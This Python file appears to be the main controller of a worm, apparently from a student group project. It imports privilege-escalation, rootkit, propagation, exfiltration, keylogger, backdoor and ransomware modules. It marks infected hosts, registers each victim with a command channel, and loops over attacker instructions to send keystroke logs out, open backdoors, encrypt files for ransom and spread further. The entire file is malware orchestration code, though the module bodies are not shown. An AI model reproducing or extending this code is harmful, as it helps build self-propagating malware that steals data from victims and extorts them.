###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import os
import netifaces
import subprocess
from time import sleep

from modules import privesc
from modules import rootkit
from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions
from modules import ransomware

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

# Path: /home/$USER/GR0up7.pem
NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")

# Computer is already infected
# if os.path.exists(NO_INFECTION_FILE): exit()

# PUBLIC_IP = os.environ.get("USER")
try:
    PUBLIC_IP = netifaces.ifaddresses("enp0s3")[netifaces.AF_INET][0]["addr"]
except ValueError:
    exit()
print(f"Network IP: {PUBLIC_IP}")

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################


def main():
    print("Worm just landed!")

    # Creates a file for the propagation module to identify whether a computer is already infected or not
    if not (os.path.exists(NO_INFECTION_FILE)):
        with open(NO_INFECTION_FILE, "w") as file:
            pass

    # Creates a instructions file on the server for this specific victim
    instructions.create_victim_instruction(PUBLIC_IP)

    # Map modules to function
    modules = {
        "privesc": privesc.run,
        "rootkit": rootkit.run,
        "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
        "instructions": lambda victim_ip: instructions.run(victim_ip),
        "ransomware": ransomware.run,
    }

    # First step
    next_step = "privesc"
    result = None

    while next_step != "clean":
        # Execute module and get result and next step
        if next_step == "instructions":
            result, next_step = modules[next_step](PUBLIC_IP)
        else:
            result, next_step = modules[next_step]()
        result = result.split(" ")

        if result and len(result) >= 2:
            # print(result)
            if result[0] == "keylogger":
                if result[1] == "send_log":
                    instructions.send_keylog_to_attacker(PUBLIC_IP)
                elif result[1] == "reset_log":
                    instructions.reset_keylog_file()

            elif result[0] == "backdoor":
                print("test1")
                if len(result) >= 3:
                    print("test2")
                    backdoor.run(result[1], result[2])

            elif result[0] == "ransomware":
                if result[1] == "encrypt":
                    ransomware.encrypt_ransomware()
                elif result[1] == "decrypt":
                    instructions.download_secret_key()

            elif result[0] == "propagation":
                if result[1] == "start":
                    propagation.run()

            if result != "no_data":
                instructions.reset_instruction(PUBLIC_IP)
        elif not result:
            print(f"[-] Module {next_step} failed!")
            break

        if next_step == "instructions":
            sleep(4)


if __name__ == "__main__":
    main()
